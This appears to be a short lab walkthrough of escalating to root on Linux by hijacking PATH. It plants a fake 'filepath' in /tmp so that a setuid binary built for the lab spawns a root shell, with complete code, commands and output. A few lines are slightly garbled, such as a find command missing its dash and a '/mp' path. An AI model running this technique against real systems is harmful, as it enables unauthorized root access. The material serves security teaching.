# Unix Shell

## 01 - Detect

```
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

We will compile a shell to further elevate to root privileges from the compromised Linux machine with least privileges.

```
$ cat path.c
#include <unistd.h>
void main() {
    setuid(0);
    setgid(0);
    system("filepath");
}
$ sudo gcc -o path path.c -w
$ sudo chmod u+s path
$ ls -lh
-rwsr-xr-x 1 root root 16K Jan 20 19:04 path
-rw-r--r-- 1 user user  81 Jan 20 18:43 path.c

$ find / writable 2>/dev/null | cut -d "/" -f 2 | sort -u

bin
boot
.cache
dev
etc
home
initrd.img
initrd.img.old
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

Unfortunately nothing is writable that starts with usr since most of them are root

```
$ find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
usr/lib
```

Let's try looking for other world writable directories

```
$ find / -writable 2>/dev/null | cut -d "/" -f 1,2,3 | grep -v proc | sort -u
/dev/block
/dev/cdrom
/dev/char
/dev/disk
/dev/dri
/dev/fb0
/dev/fd
/dev/full
/dev/fuse
/dev/log
/dev/mqueue
/dev/net
/dev/null
/dev/ptmx
/dev/pts
/dev/random
/dev/shm
/dev/snd
/dev/sr0
/dev/stderr
/dev/stdin
/dev/stdout
/dev/tty
/dev/ttyS0
/dev/ttyS1
/dev/ttyS2
/dev/ttyS3
/dev/urandom
/dev/vfio
/dev/zero
/etc/systemd
/home/user
/run/dbus
/run/lock
/run/screen
/run/shm
/run/systemd
/run/udev
/run/user
/sys/fs
/sys/kernel
/tmp
/usr/lib
/var/lib
/var/lock
/var/spool
/var/tmp
```

Looks the `/home/user`, `/tmp`, and `/dev/shm` directory are the best locations to insert our shell to exploit the **PATH**. We will copy the `/bin/bash` to rename it as `filepath`

## 02 - Exploit

```
$ export PATH=/tmp:$PATH
$ echo $PATH
/mp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ echo "/bin/bash" > /tmp/filepath
$ ls -lh /tmp/filepath
-rw-r--r-- 1 user user 10 Jan 20 19:41 /tmp/filepath
$ chmod 777 /tmp/filepath
```

Now we will execute the compiled binary to exploit the PATH variable and get root privileges

```
$ ./path
# whoami
root
```

## 03 - Cleanup

```
# exit
$ rm path path.c /tmp/filepath
```